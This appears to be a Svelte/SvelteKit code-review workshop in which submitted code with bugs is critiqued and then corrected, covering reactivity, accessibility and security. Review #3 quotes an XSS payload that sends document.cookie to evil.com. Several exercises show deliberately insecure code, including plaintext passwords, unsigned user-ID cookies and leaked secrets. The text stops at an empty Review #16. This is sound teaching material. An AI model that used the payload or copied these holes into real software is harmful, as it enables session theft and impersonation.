# Code Review Workshop

> 20 "spot the bug" exercises modeled after real pull request reviews. Each one contains code with 2-3 issues ranging from subtle to obvious. Practice reading code critically before checking the senior review.

---

## How to Use This Workshop

1. Read the **Context** to understand what the developer was building.
2. Study the **Submitted code** and try to find all the issues.
3. Write down your findings before scrolling to the **Senior review**.
4. Compare your findings with the corrected code.
5. Internalize the **What this teaches** principle.

---

### Review #1 — Product Card with Reactive Price

**Context:** A junior developer built a product card component that displays a price with a discount percentage. The card should show the original price, the discounted price, and update reactively when the discount changes.

**Submitted code:**
```svelte
<script lang="ts">
  let { product } = $props();

  let discountedPrice = product.price * (1 - product.discount / 100);

  $effect(() => {
    document.title = `${product.name} - $${discountedPrice}`;
  });
</script>

<div class="card">
  <h2>{product.name}</h2>
  <p class="original">${product.price}</p>
  <p class="sale">${discountedPrice.toFixed(2)}</p>
  <img src={product.image} />
</div>

<style>
  .sale {
    color: red;
    font-weight: bold;
  }
</style>
```

**Senior review:**
1. **Non-reactive derived value** — `discountedPrice` is calculated once at initialization, not reactively. When `product.discount` changes (e.g., flash sale timer), the displayed price stays stale. Use `$derived` for values computed from reactive state.
2. **Missing alt attribute on img** — The `<img>` tag lacks an `alt` attribute, which is an accessibility violation. Svelte will warn about this at compile time. Every content image needs descriptive alt text.
3. **Document title in $effect without cleanup consideration** — While this works, setting `document.title` in an effect means it persists after navigation. Consider whether the title should reset when the component unmounts, or whether this should be handled by `<svelte:head>` in SvelteKit.

**Corrected code:**
```svelte
<script lang="ts">
  import type { Product } from '$lib/types';

  let { product }: { product: Product } = $props();

  let discountedPrice = $derived(product.price * (1 - product.discount / 100));
</script>

<svelte:head>
  <title>{product.name} - ${discountedPrice.toFixed(2)}</title>
</svelte:head>

<div class="card">
  <h2>{product.name}</h2>
  <p class="original">${product.price}</p>
  <p class="sale">${discountedPrice.toFixed(2)}</p>
  <img src={product.image} alt={product.name} />
</div>

<style>
  .sale {
    color: oklch(0.55 0.25 27);
    font-weight: bold;
  }
</style>
```

**What this teaches:** Derived values must use `$derived` to stay reactive. A plain `let x = expression` is evaluated once at component creation time. This is the single most common reactivity mistake in Svelte 5 — every value computed from props or state should be `$derived`.

---

### Review #2 — Todo List with Missing Keys

**Context:** The developer built a filterable todo list with add/remove functionality and transition animations on each item.

**Submitted code:**
```svelte
<script lang="ts">
  import { fade } from 'svelte/transition';

  let todos = $state([
    { text: 'Buy milk', done: false },
    { text: 'Write tests', done: true },
    { text: 'Deploy app', done: false }
  ]);

  let filter = $state('all');

  let filtered = $derived(
    filter === 'all' ? todos :
    filter === 'done' ? todos.filter(t => t.done) :
    todos.filter(t => !t.done)
  );

  function addTodo(text: string) {
    todos.push({ text, done: false });
  }

  function removeTodo(index: number) {
    todos.splice(index, 1);
  }
</script>

{#each filtered as todo, i}
  <div transition:fade>
    <input type="checkbox" bind:checked={todo.done} />
    <span>{todo.text}</span>
    <button onclick={() => removeTodo(i)}>Delete</button>
  </div>
{/each}
```

**Senior review:**
1. **Missing keys on {#each}** — Without a `(key)` expression, Svelte uses index-based diffing. When items are removed or the filter changes, DOM nodes get reassociated with wrong data. Animations will fire on wrong elements. Each todo needs a unique ID as a key.
2. **removeTodo uses filtered index, not source index** — When the list is filtered, `i` is the index in the `filtered` array, not the `todos` array. Deleting at index `i` from `todos` removes the wrong item. Use a stable identifier to find and remove the correct item.
3. **Global transition on filterable list** — `transition:fade` without `|local` causes animations to play when the parent component unmounts during navigation, not just when items are added/removed from this list.

**Corrected code:**
```svelte
<script lang="ts">
  import { fade } from 'svelte/transition';

  let nextId = $state(3);
  let todos = $state([
    { id: 0, text: 'Buy milk', done: false },
    { id: 1, text: 'Write tests', done: true },
    { id: 2, text: 'Deploy app', done: false }
  ]);

  let filter = $state<'all' | 'done' | 'active'>('all');

  let filtered = $derived(
    filter === 'all' ? todos :
    filter === 'done' ? todos.filter(t => t.done) :
    todos.filter(t => !t.done)
  );

  function addTodo(text: string) {
    todos.push({ id: nextId++, text, done: false });
  }

  function removeTodo(id: number) {
    const index = todos.findIndex(t => t.id === id);
    if (index !== -1) todos.splice(index, 1);
  }
</script>

{#each filtered as todo (todo.id)}
  <div transition:fade|local>
    <input type="checkbox" bind:checked={todo.done} />
    <span>{todo.text}</span>
    <button onclick={() => removeTodo(todo.id)}>Delete</button>
  </div>
{/each}
```

**What this teaches:** Keys are identity, not indices. When you operate on filtered or sorted views of data, index positions are meaningless. Always use a stable, unique identifier (database ID, UUID, or incrementing counter) as the key, and use that same identifier for mutations.

---

### Review #3 — User Profile with Untyped Props

**Context:** The developer built a user profile card that displays user information and an optional bio. The component is used across multiple pages.

**Submitted code:**
```svelte
<script lang="ts">
  let { user, showBio } = $props();

  let initials = $derived(
    user.name.split(' ').map(n => n[0]).join('')
  );
</script>

<div class="profile">
  <div class="avatar">{initials}</div>
  <h3>{user.name}</h3>
  <p>{user.email}</p>
  {#if showBio}
    <p>{@html user.bio}</p>
  {/if}
</div>
```

**Senior review:**
1. **Untyped props** — `$props()` without type annotation means `user` and `showBio` are both `any`. No autocomplete, no type checking on `user.name` or `user.email`. In strict mode, this is a compile error. Always type your props.
2. **`{@html user.bio}` without sanitization** — If `user.bio` comes from user input (profile page, CMS), this is a direct XSS vulnerability. An attacker could set their bio to `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>` and steal other users' session cookies.
3. **No default for optional `showBio` prop** — If `showBio` is optional, it should have a default value. Without one, it is `undefined`, which is falsy and works accidentally — but the intent is unclear to future developers.

**Corrected code:**
```svelte
<script lang="ts">
  import DOMPurify from 'dompurify';

  interface User {
    name: string;
    email: string;
    bio?: string;
  }

  let { user, showBio = false }: { user: User; showBio?: boolean } = $props();

  let initials = $derived(
    user.name.split(' ').map((n) => n[0]).join('')
  );

  let safeBio = $derived(
    user.bio ? DOMPurify.sanitize(user.bio) : ''
  );
</script>

<div class="profile">
  <div class="avatar">{initials}</div>
  <h3>{user.name}</h3>
  <p>{user.email}</p>
  {#if showBio && safeBio}
    <p>{@html safeBio}</p>
  {/if}
</div>
```

**What this teaches:** Security and type safety are not optional. Every `{@html}` usage must be audited for XSS. Every prop must be typed. These are not "nice to haves" — they are the difference between a professional application and a liability.

---

### Review #4 — Dashboard Data Loading

**Context:** The developer created a dashboard page that loads user statistics from an API endpoint.

**Submitted code:**
```typescript
// +page.ts
export const load = async () => {
  const res = await fetch('/api/stats');
  const stats = await res.json();
  return { stats };
};
```
```svelte
<!-- +page.svelte -->
<script lang="ts">
  let { data } = $props();
</script>

<h1>Dashboard</h1>
<p>Total users: {data.stats.totalUsers}</p>
<p>Revenue: ${data.stats.revenue}</p>
<p>Active: {data.stats.activeUsers}</p>
```

**Senior review:**
1. **Using global `fetch` instead of SvelteKit's `fetch`** — The load function does not destructure `fetch` from the event parameter. During SSR, global `fetch` does not know the server's origin, so `/api/stats` fails. SvelteKit's provided fetch also forwards cookies and deduplicates requests.
2. **No error handling** — If the API returns a 500 error or the network fails, `res.json()` will throw or return unexpected data. The page crashes with an unhelpful error instead of showing a user-friendly message.
3. **No loading state or type safety** — The template assumes `data.stats` always has the expected shape. There is no TypeScript interface, no null check, and no loading indicator. If the data shape changes, errors will be runtime, not compile-time.

**Corrected code:**
```typescript
// +page.ts
import { error } from '@sveltejs/kit';
import type { PageLoad } from './$types';

interface Stats {
  totalUsers: number;
  revenue: number;
  activeUsers: number;
}

export const load: PageLoad = async ({ fetch }) => {
  const res = await fetch('/api/stats');

  if (!res.ok) {
    error(res.status, 'Failed to load dashboard statistics');
  }

  const stats: Stats = await res.json();
  return { stats };
};
```
```svelte
<!-- +page.svelte -->
<script lang="ts">
  let { data } = $props();
</script>

<h1>Dashboard</h1>
<p>Total users: {data.stats.totalUsers.toLocaleString()}</p>
<p>Revenue: ${data.stats.revenue.toLocaleString()}</p>
<p>Active: {data.stats.activeUsers.toLocaleString()}</p>
```

**What this teaches:** Load functions are the most critical code in a SvelteKit app — they run on every page visit. Always destructure `fetch` from the event, handle errors with `error()`, and type the return value. These three practices prevent the majority of data-loading bugs.

---

### Review #5 — Form with Missing Progressive Enhancement

**Context:** The developer built a contact form that submits data to a form action.

**Submitted code:**
```svelte
<script lang="ts">
  let { form } = $props();
  let submitting = $state(false);

  async function handleSubmit(event: SubmitEvent) {
    event.preventDefault();
    submitting = true;
    const formData = new FormData(event.target as HTMLFormElement);
    const res = await fetch('?/submit', {
      method: 'POST',
      body: formData
    });
    submitting = false;
    if (res.ok) alert('Sent!');
  }
</script>

<form onsubmit={handleSubmit}>
  <input name="email" type="email" required />
  <textarea name="message" required></textarea>
  <button disabled={submitting}>
    {submitting ? 'Sending...' : 'Send'}
  </button>
</form>
```

**Senior review:**
1. **Bypassing SvelteKit's form action system** — Instead of using `method="POST"` with `use:enhance`, the developer manually calls `fetch` to the action URL. This breaks progressive enhancement (form will not work without JS), bypasses SvelteKit's CSRF protection, and does not properly handle ActionData.
2. **Using `alert()` for success feedback** — `alert()` blocks the UI thread, is not styleable, cannot be dismissed programmatically, and is a terrible UX pattern. Use reactive state to show a success message in the UI.
3. **No error handling on form failure** — If the fetch fails or returns a validation error, the user sees nothing. The `submitting` state gets stuck as `false` with no feedback about what went wrong.

**Corrected code:**
```svelte
<script lang="ts">
  import { enhance } from '$app/forms';

  let { form } = $props();
  let submitting = $state(false);
</script>

<form
  method="POST"
  action="?/submit"
  use:enhance={() => {
    submitting = true;
    return async ({ update }) => {
      submitting = false;
      await update();
    };
  }}
>
  <input name="email" type="email" required />
  <textarea name="message" required></textarea>
  <button disabled={submitting}>
    {submitting ? 'Sending...' : 'Send'}
  </button>

  {#if form?.success}
    <p class="success">Message sent successfully!</p>
  {/if}
  {#if form?.error}
    <p class="error">{form.error}</p>
  {/if}
</form>
```

**What this teaches:** SvelteKit's form actions and `use:enhance` exist for a reason. They provide CSRF protection, progressive enhancement (works without JS), proper error handling via ActionData, and integration with the SvelteKit lifecycle. Rolling your own fetch-based submission throws all of that away.

---

### Review #6 — Effect Without Cleanup

**Context:** The developer built a component that tracks the user's mouse position and displays coordinates on screen.

**Submitted code:**
```svelte
<script lang="ts">
  let x = $state(0);
  let y = $state(0);

  $effect(() => {
    window.addEventListener('mousemove', (e) => {
      x = e.clientX;
      y = e.clientY;
    });
  });
</script>

<div class="cursor-display">
  Mouse: {x}, {y}
</div>
```

**Senior review:**
1. **No event listener cleanup** — The `$effect` adds an event listener but never removes it. Every time the component re-renders or the effect re-runs, a new listener is added without removing the previous one. Over time, this leaks memory and causes increasingly slow performance as hundreds of redundant listeners accumulate.
2. **SSR crash potential** — `window` does not exist during SSR. While `$effect` only runs on the client, this is worth noting for documentation and maintainability.
3. **No throttling on mousemove** — `mousemove` fires at 60+ times per second. Updating reactive state that frequently is wasteful if the display only updates visually at the frame rate. Consider throttling with `requestAnimationFrame`.

**Corrected code:**
```svelte
<script lang="ts">
  let x = $state(0);
  let y = $state(0);

  $effect(() => {
    let frame: number;
    function handleMouseMove(e: MouseEvent) {
      cancelAnimationFrame(frame);
      frame = requestAnimationFrame(() => {
        x = e.clientX;
        y = e.clientY;
      });
    }

    window.addEventListener('mousemove', handleMouseMove);

    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      cancelAnimationFrame(frame);
    };
  });
</script>

<div class="cursor-display">
  Mouse: {x}, {y}
</div>
```

**What this teaches:** Every `addEventListener` must have a corresponding `removeEventListener` in the effect cleanup. Every timer must be cleared. Every subscription must be unsubscribed. The `$effect` return function is your cleanup hook — treat it as mandatory for any side effect that creates ongoing subscriptions.

---

### Review #7 — Accessible Modal Dialog

**Context:** The developer built a modal dialog component for confirming destructive actions (delete account, remove data).

**Submitted code:**
```svelte
<script lang="ts">
  let { open, onConfirm, onCancel } = $props();
</script>

{#if open}
  <div class="overlay" onclick={onCancel}>
    <div class="modal" onclick={(e) => e.stopPropagation()}>
      <h2>Are you sure?</h2>
      <p>This action cannot be undone.</p>
      <div class="buttons">
        <button onclick={onCancel}>Cancel</button>
        <button onclick={onConfirm} class="danger">Delete</button>
      </div>
    </div>
  </div>
{/if}

<style>
  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.5);
    display: flex;
    align-items: center;
    justify-content: center;
  }
</style>
```

**Senior review:**
1. **No focus management** — When the modal opens, focus stays on whatever element was previously focused (likely behind the overlay). Keyboard users cannot interact with the modal. Focus should be trapped inside the modal and returned to the trigger when closed.
2. **No keyboard support** — Pressing Escape does not close the modal. There is no `role="dialog"`, no `aria-modal="true"`, and no `aria-labelledby`. Screen readers do not announce this as a dialog.
3. **Click-only overlay dismiss** — `onclick` on the overlay only works for mouse users. Keyboard users have no way to dismiss the modal except by tabbing to the Cancel button (which they cannot reach without focus trapping).

**Corrected code:**
```svelte
<script lang="ts">
  let { open, onConfirm, onCancel }: {
    open: boolean;
    onConfirm: () => void;
    onCancel: () => void;
  } = $props();

  let dialogRef: HTMLDialogElement | undefined;

  $effect(() => {
    if (open && dialogRef) {
      dialogRef.showModal();
    } else if (dialogRef) {
      dialogRef.close();
    }
  });

  function handleClose() {
    onCancel();
  }
</script>

<dialog
  bind:this={dialogRef}
  onclose={handleClose}
  aria-labelledby="dialog-title"
>
  <h2 id="dialog-title">Are you sure?</h2>
  <p>This action cannot be undone.</p>
  <div class="buttons">
    <button onclick={onCancel}>Cancel</button>
    <button onclick={onConfirm} class="danger">Delete</button>
  </div>
</dialog>

<style>
  dialog::backdrop {
    background: oklch(0.1 0 0 / 0.5);
  }
  dialog {
    border: none;
    border-radius: 0.5rem;
    padding: 2rem;
    max-width: 28rem;
  }
</style>
```

**What this teaches:** Use the native `<dialog>` element instead of building modals from `<div>`. It provides focus trapping, Escape key handling, backdrop styling, `aria-modal`, screen reader announcements, and top-layer rendering for free. Custom div-based modals require hundreds of lines of JavaScript to replicate what the browser gives you natively.

---

### Review #8 — Server Route Leaking Secrets

**Context:** The developer built an API route that returns user data and uses environment variables for database access.

**Submitted code:**
```typescript
// src/routes/api/users/+server.ts
import { DATABASE_URL, API_SECRET } from '$env/static/private';

export const GET = async () => {
  const response = await fetch(DATABASE_URL + '/users', {
    headers: { Authorization: `Bearer ${API_SECRET}` }
  });
  const users = await response.json();

  return new Response(JSON.stringify({
    users,
    debug: {
      dbUrl: DATABASE_URL,
      apiSecret: API_SECRET,
      timestamp: Date.now()
    }
  }));
};
```

**Senior review:**
1. **Leaking secrets in the response** — The `debug` object includes `DATABASE_URL` and `API_SECRET` in the JSON response. Anyone who calls this endpoint can see your database connection string and API key. Never include secrets in HTTP responses.
2. **Missing Content-Type header** — The response is JSON but does not set `Content-Type: application/json`. Use SvelteKit's `json()` helper instead of manual `Response` construction.
3. **No authentication on the endpoint** — Any anonymous user can call `GET /api/users` and receive the full user list. There is no session check, no authorization, and no rate limiting.

**Corrected code:**
```typescript
// src/routes/api/users/+server.ts
import { json, error } from '@sveltejs/kit';
import { DATABASE_URL, API_SECRET } from '$env/static/private';
import type { RequestHandler } from './$types';

export const GET: RequestHandler = async ({ locals }) => {
  if (!locals.user) {
    error(401, 'Authentication required');
  }

  if (locals.user.role !== 'admin') {
    error(403, 'Admin access required');
  }

  const response = await fetch(DATABASE_URL + '/users', {
    headers: { Authorization: `Bearer ${API_SECRET}` }
  });

  if (!response.ok) {
    error(502, 'Failed to fetch user data');
  }

  const users = await response.json();

  // Return only the fields the client needs
  const sanitizedUsers = users.map((u: { id: string; name: string; email: string }) => ({
    id: u.id,
    name: u.name,
    email: u.email
  }));

  return json({ users: sanitizedUsers });
};
```

**What this teaches:** Never trust that server-side code is invisible. API responses are visible to anyone with DevTools. Never include secrets, database URLs, internal IDs, or debug information in production responses. Always authenticate, always authorize, and always sanitize response data to include only what the client needs.

---

### Review #9 — Performance Anti-Pattern with Nested Effects

**Context:** The developer built a search component that filters a large product list and tracks analytics for each search.

**Submitted code:**
```svelte
<script lang="ts">
  let products = $state<Product[]>([]);
  let query = $state('');
  let filtered = $state<Product[]>([]);

  $effect(() => {
    fetch('/api/products')
      .then(r => r.json())
      .then(data => { products = data; });
  });

  $effect(() => {
    filtered = products.filter(p =>
      p.name.toLowerCase().includes(query.toLowerCase())
    );
  });

  $effect(() => {
    if (query.length > 0) {
      fetch('/api/analytics', {
        method: 'POST',
        body: JSON.stringify({ query, results: filtered.length })
      });
    }
  });
</script>

<input bind:value={query} placeholder="Search products..." />
{#each filtered as product}
  <div>{product.name} - ${product.price}</div>
{/each}
```

**Senior review:**
1. **Using `$effect` for derived state** — The second effect sets `filtered` by reading `products` and `query`. This is a derived computation, not a side effect. Use `$derived` instead. Using `$effect` for derivations causes unnecessary intermediate states where `filtered` is stale.
2. **Analytics fires on every keystroke** — The third effect sends an analytics request for every character typed. Typing "shoes" triggers 5 API calls. Debounce the analytics call so it only fires after the user stops typing.
3. **No fetch cleanup or abort** — The first effect fetches products but has no AbortController. If the component unmounts during the fetch, the response callback updates state on a destroyed component.

**Corrected code:**
```svelte
<script lang="ts">
  let products = $state<Product[]>([]);
  let query = $state('');

  let filtered = $derived(
    products.filter(p =>
      p.name.toLowerCase().includes(query.toLowerCase())
    )
  );

  // Data fetching with cleanup
  $effect(() => {
    const controller = new AbortController();
    fetch('/api/products', { signal: controller.signal })
      .then(r => r.json())
      .then(data => { products = data; })
      .catch(e => {
        if (e.name !== 'AbortError') console.error(e);
      });
    return () => controller.abort();
  });

  // Debounced analytics
  $effect(() => {
    if (query.length === 0) return;

    const currentQuery = query;
    const currentCount = filtered.length;
    const timeout = setTimeout(() => {
      fetch('/api/analytics', {
        method: 'POST',
        body: JSON.stringify({ query: currentQuery, results: currentCount }),
        headers: { 'Content-Type': 'application/json' }
      });
    }, 500);

    return () => clearTimeout(timeout);
  });
</script>

<input bind:value={query} placeholder="Search products..." />
{#each filtered as product (product.id)}
  <div>{product.name} - ${product.price}</div>
{/each}
```

**What this teaches:** `$derived` is for computing values from reactive dependencies. `$effect` is for side effects that interact with the outside world (DOM, network, timers). If your effect's primary purpose is to set a reactive variable based on other reactive variables, it should be `$derived`. Side effects should be debounced when triggered by rapid user input.

---

### Review #10 — CSS Specificity Conflict in Component Library

**Context:** The developer built a Button component for a shared library. Users report that the button styles are overridden by their page styles.

**Submitted code:**
```svelte
<script lang="ts">
  let { variant = 'primary', children } = $props();
</script>

<button class="btn btn-{variant}">
  {@render children?.()}
</button>

<style>
  .btn {
    padding: 0.5rem 1rem;
    border: none;
    border-radius: 4px;
    cursor: pointer;
  }
  .btn-primary {
    background: blue;
    color: white;
  }
  .btn-secondary {
    background: gray;
    color: white;
  }
</style>
```

**Senior review:**
1. **Dynamic class name defeats CSS scoping** — `class="btn-{variant}"` generates a dynamic class name that the Svelte compiler cannot statically analyze. The CSS rules `.btn-primary` and `.btn-secondary` may be flagged as unused selectors or not properly scoped because the compiler does not know at compile time which values `variant` will have.
2. **No CSS custom properties for customization** — Users who want to change the button color must use `:global()` to override, leading to specificity wars. Expose design tokens via CSS custom properties so consumers can customize without fighting scoping.
3. **No type constraint on variant prop** — `variant` accepts any string. Passing `variant="danger"` silently produces `btn-danger` which has no styles. Use a union type to constrain valid values.

**Corrected code:**
```svelte
<script lang="ts">
  import type { Snippet } from 'svelte';

  type Variant = 'primary' | 'secondary' | 'danger';

  let {
    variant = 'primary',
    children
  }: {
    variant?: Variant;
    children?: Snippet;
  } = $props();
</script>

<button class="btn" data-variant={variant}>
  {@render children?.()}
</button>

<style>
  .btn {
    padding: var(--btn-padding, 0.5rem 1rem);
    border: none;
    border-radius: var(--btn-radius, 4px);
    cursor: pointer;
    font-family: inherit;
    font-size: inherit;
  }
  .btn[data-variant='primary'] {
    background: var(--btn-bg, oklch(0.55 0.2 250));
    color: var(--btn-color, white);
  }
  .btn[data-variant='secondary'] {
    background: var(--btn-bg, oklch(0.6 0.02 250));
    color: var(--btn-color, white);
  }
  .btn[data-variant='danger'] {
    background: var(--btn-bg, oklch(0.55 0.22 27));
    color: var(--btn-color, white);
  }
</style>
```

**What this teaches:** Component libraries need a styling API. CSS custom properties are the bridge between component encapsulation and consumer customization. Data attributes (`data-variant`) are more reliable than dynamic class names for CSS scoping. And TypeScript union types prevent silent "no matching style" bugs.

---

### Review #11 — SSR/Hydration Mismatch with Date Formatting

**Context:** The developer built a blog post component that displays the publication date formatted for the user's locale.

**Submitted code:**
```svelte
<script lang="ts">
  let { post } = $props();

  const formattedDate = new Intl.DateTimeFormat('en-US', {
    dateStyle: 'long',
    timeStyle: 'short'
  }).format(new Date(post.publishedAt));
</script>

<article>
  <h1>{post.title}</h1>
  <time datetime={post.publishedAt}>{formattedDate}</time>
  <div>{@html post.content}</div>
</article>
```

**Senior review:**
1. **Hydration mismatch on time** — `Intl.DateTimeFormat` with `timeStyle` produces timezone-dependent output. The server formats in its timezone (UTC or server-local), the client formats in the user's timezone. The rendered strings differ, causing a hydration mismatch warning and potential UI flicker.
2. **`{@html post.content}` without sanitization** — If `post.content` comes from a CMS or user-generated markdown, it must be sanitized. Even trusted CMS content can contain XSS if the CMS is compromised.
3. **Non-reactive formatting** — The formatted date is computed once. If `post` were reactive (updated via real-time sync), the date would not update.

**Corrected code:**
```svelte
<script lang="ts">
  import DOMPurify from 'dompurify';
  import { browser } from '$app/environment';

  interface BlogPost {
    title: string;
    publishedAt: string;
    content: string;
  }

  let { post }: { post: BlogPost } = $props();

  // Use date-only format to avoid timezone mismatch
  let formattedDate = $derived(
    new Intl.DateTimeFormat('en-US', {
      dateStyle: 'long'
    }).format(new Date(post.publishedAt))
  );

  let safeContent = $derived(
    browser ? DOMPurify.sanitize(post.content) : post.content
  );
</script>

<article>
  <h1>{post.title}</h1>
  <time datetime={post.publishedAt}>{formattedDate}</time>
  <div>{@html safeContent}</div>
</article>
```

**What this teaches:** Any value that differs between server and client causes hydration mismatches. Dates with times, locale-dependent formatting, and timezone conversions are the most common culprits. Either use date-only formats (timezone-independent), or defer time formatting to a client-only `$effect`.

---

### Review #12 — Wrong Rendering Mode for E-Commerce

**Context:** The developer set all product pages to use SSG (static site generation) for performance, but prices and inventory change frequently.

**Submitted code:**
```typescript
// src/routes/products/[slug]/+page.ts
export const prerender = true;

export const load = async ({ params, fetch }) => {
  const res = await fetch(`/api/products/${params.slug}`);
  const product = await res.json();
  return { product };
};
```

**Senior review:**
1. **SSG for dynamic data** — Product prices, inventory, and reviews change constantly. Prerendered pages are generated at build time and stay frozen until the next deployment. Customers will see stale prices and buy out-of-stock items.
2. **No ISR or revalidation strategy** — Even if the data changes slowly, there is no mechanism to update the static pages. The developer should either use SSR (fresh on every request) or ISR (revalidate periodically).
3. **Missing error handling and type safety** — No error handling on the fetch, no TypeScript types for the product data, and no handling of 404 (product not found).

**Corrected code:**
```typescript
// src/routes/products/[slug]/+page.server.ts
import { error } from '@sveltejs/kit';
import type { PageServerLoad } from './$types';
import { db } from '$lib/server/db';

// SSR — fresh data on every request
export const load: PageServerLoad = async ({ params }) => {
  const product = await db.product.findUnique({
    where: { slug: params.slug }
  });

  if (!product) {
    error(404, `Product "${params.slug}" not found`);
  }

  return { product };
};

// Use prerender ONLY for truly static pages like /about, /terms
// export const prerender = false; // this is the default
```

**What this teaches:** Rendering mode is an architecture decision, not a performance toggle. SSG is for content that changes at deploy time (docs, blog posts, landing pages). SSR is for content that changes per-request (prices, inventory, user data). Choosing the wrong mode causes stale data in production. See ADR #1 in the Architecture Decisions reference.

---

### Review #13 — Context API Misuse

**Context:** The developer tried to share state across multiple pages using Svelte's context API.

**Submitted code:**
```svelte
<!-- +layout.svelte -->
<script lang="ts">
  import { setContext } from 'svelte';

  let theme = $state<'light' | 'dark'>('light');
  setContext('theme', theme);
</script>

<slot />
```
```svelte
<!-- +page.svelte (child page) -->
<script lang="ts">
  import { getContext } from 'svelte';

  let theme = getContext('theme');

  function toggleTheme() {
    theme = theme === 'light' ? 'dark' : 'light';
  }
</script>

<button onclick={toggleTheme}>Toggle: {theme}</button>
```

**Senior review:**
1. **Passing the value, not the reactive reference** — `setContext('theme', theme)` passes the current value of `theme` (the string `'light'`), not a reactive reference. When the child calls `getContext('theme')`, it gets a static string. Mutations in the child do not propagate back to the parent, and parent changes do not reach the child.
2. **Child mutating context directly** — Even if the context were reactive, the child should not directly mutate shared state. This creates unpredictable bidirectional data flow. Use a reactive class or object with explicit methods.
3. **String key for context** — Using string keys (`'theme'`) is fragile and can collide with other libraries. Use a Symbol or a typed constant as the context key.

**Corrected code:**
```typescript
// lib/theme.svelte.ts
const THEME_KEY = Symbol('theme');

export class ThemeState {
  current = $state<'light' | 'dark'>('light');

  toggle() {
    this.current = this.current === 'light' ? 'dark' : 'light';
  }
}

export function setThemeContext() {
  const theme = new ThemeState();
  setContext(THEME_KEY, theme);
  return theme;
}

export function getThemeContext(): ThemeState {
  return getContext<ThemeState>(THEME_KEY);
}
```
```svelte
<!-- +layout.svelte -->
<script lang="ts">
  import { setThemeContext } from '$lib/theme.svelte';
  const theme = setThemeContext();
</script>

<div data-theme={theme.current}>
  {@render children?.()}
</div>
```
```svelte
<!-- +page.svelte -->
<script lang="ts">
  import { getThemeContext } from '$lib/theme.svelte';
  const theme = getThemeContext();
</script>

<button onclick={() => theme.toggle()}>
  Toggle: {theme.current}
</button>
```

**What this teaches:** Context passes a reference, not a reactive subscription. To share reactive state via context, pass a reactive object (a class with `$state` fields) or a reactive store. The context is just the delivery mechanism — the reactivity comes from the object itself.

---

### Review #14 — Table Component Without Memoization

**Context:** The developer built a data table that re-sorts and re-filters on every render, causing the page to freeze with 10,000+ rows.

**Submitted code:**
```svelte
<script lang="ts">
  let { data } = $props();
  let sortCol = $state('name');
  let sortDir = $state<'asc' | 'desc'>('asc');
  let search = $state('');

  function getDisplayData() {
    console.log('Computing display data...'); // fires constantly
    let result = [...data];

    if (search) {
      result = result.filter(row =>
        Object.values(row).some(v =>
          String(v).toLowerCase().includes(search.toLowerCase())
        )
      );
    }

    result.sort((a, b) => {
      const val = a[sortCol] > b[sortCol] ? 1 : -1;
      return sortDir === 'asc' ? val : -val;
    });

    return result;
  }
</script>

{#each getDisplayData() as row}
  <tr>
    <td>{row.name}</td>
    <td>{row.email}</td>
  </tr>
{/each}
```

**Senior review:**
1. **Function call in template re-executes every render** — `getDisplayData()` is called in the `{#each}` expression. Svelte re-evaluates template expressions whenever any reactive dependency in the component changes. Every keystroke in any input, every state change, triggers a full re-sort and re-filter of 10,000 rows.
2. **Copying the entire array on every computation** — `[...data]` creates a shallow copy of the full dataset every time. With 10,000 rows, this creates significant garbage collection pressure.
3. **Missing keys on {#each}** — Large lists absolutely require keys for efficient DOM diffing. Without keys, Svelte rebuilds the entire table on every update.

**Corrected code:**
```svelte
<script lang="ts">
  let { data }: { data: Array<Record<string, string>> } = $props();
  let sortCol = $state('name');
  let sortDir = $state<'asc' | 'desc'>('asc');
  let search = $state('');

  let displayData = $derived.by(() => {
    let result = data;

    if (search) {
      const searchLower = search.toLowerCase();
      result = result.filter(row =>
        Object.values(row).some(v =>
          String(v).toLowerCase().includes(searchLower)
        )
      );
    }

    return [...result].sort((a, b) => {
      const val = a[sortCol] > b[sortCol] ? 1 : -1;
      return sortDir === 'asc' ? val : -val;
    });
  });
</script>

{#each displayData as row (row.id)}
  <tr>
    <td>{row.name}</td>
    <td>{row.email}</td>
  </tr>
{/each}
```

**What this teaches:** `$derived` is memoized — it only recomputes when its dependencies (`data`, `sortCol`, `sortDir`, `search`) actually change. A function call in the template has no memoization and runs on every render cycle. For expensive computations, always use `$derived` or `$derived.by`. For truly large datasets (10,000+ rows), consider TanStack Table which provides virtualization.

---

### Review #15 — Insecure Cookie-Based Auth

**Context:** The developer implemented a login system that stores the user ID directly in a cookie.

**Submitted code:**
```typescript
// src/routes/login/+page.server.ts
export const actions = {
  default: async ({ request, cookies }) => {
    const data = await request.formData();
    const email = data.get('email') as string;
    const password = data.get('password') as string;

    const user = await db.user.findByEmail(email);
    if (user && user.password === password) {
      cookies.set('userId', user.id, { path: '/' });
      redirect(303, '/dashboard');
    }

    return fail(401, { error: 'Invalid credentials' });
  }
};
```

**Senior review:**
1. **Comparing passwords in plain text** — `user.password === password` means passwords are stored in plain text in the database. If the database is breached, every user's password is exposed. Passwords must be hashed with Argon2, bcrypt, or PBKDF2.
2. **User ID in cookie without signing** — Storing `userId` directly in a cookie lets any user edit the cookie value to impersonate another user. A malicious user changes `userId` from `123` to `1` (the admin) and gains full access. Use signed session tokens.
3. **Cookie missing security attributes** — No `httpOnly` (JavaScript can read it), no `Secure` (sent over HTTP), no `SameSite` (vulnerable to CSRF), and no expiration (lives forever).

**Corrected code:**
```typescript
// src/routes/login/+page.server.ts
import { fail, redirect } from '@sveltejs/kit';
import { verify } from '@node-rs/argon2';
import { generateSessionToken, createSession } from '$lib/server/auth';

export const actions = {
  default: async ({ request, cookies }) => {
    const data = await request.formData();
    const email = data.get('email') as string;
    const password = data.get('password') as string;

    const user = await db.user.findByEmail(email);
    if (!user) {
      return fail(401, { error: 'Invalid credentials' });
    }

    const validPassword = await verify(user.passwordHash, password);
    if (!validPassword) {
      return fail(401, { error: 'Invalid credentials' });
    }

    const token = generateSessionToken(); // crypto.randomBytes(32)
    await createSession(token, user.id);

    cookies.set('session', token, {
      path: '/',
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      maxAge: 60 * 60 * 24 * 30 // 30 days
    });

    redirect(303, '/dashboard');
  }
};
```

**What this teaches:** Authentication code has no room for shortcuts. Plain-text passwords are a career-ending mistake. Unsigned cookies are an impersonation vector. Missing cookie attributes are a CSRF vector. Every authentication implementation must use: hashed passwords (Argon2 preferred), random session tokens, and properly attributed cookies.

---

### Review #16 — Layout Without Error Boundary

**Context:** The developer built an app layout with a sidebar and main content area. When any child page throws an error, the entire app crashes to a white screen.

**Submitted code:**
```svelte
